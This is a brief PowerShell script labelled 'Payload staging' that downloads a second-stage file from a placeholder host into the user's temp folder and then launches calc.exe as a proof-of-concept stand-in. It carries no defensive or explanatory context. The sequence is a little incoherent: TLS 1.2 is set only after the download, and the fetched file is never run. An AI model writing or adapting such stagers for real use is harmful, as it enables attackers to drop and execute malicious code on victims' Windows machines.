
<# Payload staging #>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'http://example.net/downloads/payload.bin',
    [string]$WorkingPath = "$env:TEMP\stage2.bin"
)
(New-Object System.Net.WebClient).DownloadFile($TransferUrl, $WorkingPath)
Start-Process -FilePath "calc.exe"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
